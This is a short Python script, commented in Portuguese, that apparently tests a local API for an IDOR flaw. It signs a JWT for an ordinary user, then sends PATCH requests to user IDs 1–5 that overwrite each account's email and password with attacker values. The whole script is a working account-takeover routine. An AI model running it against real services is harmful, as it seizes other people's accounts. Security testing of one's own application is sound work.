import requests
import jwt
import json

# Fase 1: Definir o cabeçalho HTTP 'Authorization' utilizando um token JWT de um utilizador comum
def gerar_token_jwt():
    # Parâmetros para gerar o token JWT
    secret_key = "sua_secret_key_aqui"  # Substitua por sua secret key
    payload = {
        "id": 100,  # ID de um utilizador comum
        "nome": "Utilizador Comum",
        "email": "comum@example.com",
        "role": "comum"
    }
    token = jwt.encode(payload, secret_key, algorithm="HS256")
    return token

# Fase 2: Definir o payload JSON
def gerar_payload():
    return {
        "email": "pwned@hacker.com",
        "senha": "Pwned123!"
    }

# Fase 3: Enviar pedidos PATCH e verificar respostas
def testar_account_takeover():
    token_jwt = gerar_token_jwt()
    payload = gerar_payload()
    headers = {
        "Authorization": f"Bearer {token_jwt}",
        "Content-Type": "application/json"
    }
    
    for id in range(1, 6):  # Iterar de ID 1 a 5
        url = f"http://localhost:8080/api/users/{id}"
        resposta = requests.patch(url, headers=headers, data=json.dumps(payload))
        
        if resposta.status_code == 200:
            print(f"Account Takeover por IDOR confirmado no endpoint {url}")
        elif resposta.status_code == 403:
            print(f"Requisição corretamente bloqueada com 403 Forbidden para o ID {id}")
        else:
            print(f"Requisição para o ID {id} retornou status code {resposta.status_code}")

testar_account_takeover()